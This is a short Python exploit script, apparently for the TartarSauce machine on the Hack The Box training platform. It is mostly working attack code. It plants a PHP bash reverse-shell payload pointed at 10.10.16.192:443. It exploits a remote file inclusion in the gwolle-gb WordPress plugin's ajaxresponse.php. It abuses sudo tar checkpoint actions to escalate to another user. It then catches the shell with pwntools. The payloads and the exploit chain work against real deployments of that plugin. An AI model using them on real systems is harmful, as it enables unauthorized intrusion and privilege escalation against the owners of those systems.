#!/usr/bin/python3

import requests,sys,os,threading
from pwn import *

def buildpayload(user):

    if user == "www-data":
        with open("wp-load.php","w") as wp_load:
            wp_load.write("<?php\n\tsystem('bash -c \"bash -i >& /dev/tcp/10.10.16.192/443 0>&1\"');\n?>")  
     
    else: 
        line1 = "<?php"
        line2 = "system(\"echo -e '#!/bin/bash\\nbash -i >& /dev/tcp/10.10.16.192/443 0>&1' > /dev/shm/.proc.sh\");"
        line3 = "system(\"sudo -u onuma /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='bash /dev/shm/.proc.sh'\");"
        line4 = "?>"
        with open("wp-load.php","w") as wp_load:
            wp_load.write("%s \n\t %s \n\t %s \n%s" % (line1,line2,line3,line4))

def makerequest():
    s = requests.Session()
    s.get("http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.16.192:8000/")

def rfi():

    try :
        threading.Thread(target=makerequest).start()
    except Exception as e:
        log.error(str(e))
    

    shell = listen(443, timeout=20).wait_for_connection()

    if shell.sock is None:
        log.failure("No se ha obtenido ninguna conexion")
    else :
        log.success("Se ha establecido una sesion")
    
    shell.interactive()

def main():
    if (len(sys.argv) == 2 or sys.argv[1] == "www-data" or sys.argv[1] == "onuma"):
        print("[!] Ejecute : python3 -m http.server")
        buildpayload(sys.argv[1])
        #s = requests.Session()
        #s.get("http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.16.192:8000/")
        rfi()
    else :
        print("[!] Usage: python3 autopwn.py onuma/www-data")
        exit(0)


if __name__ == "__main__":
    main()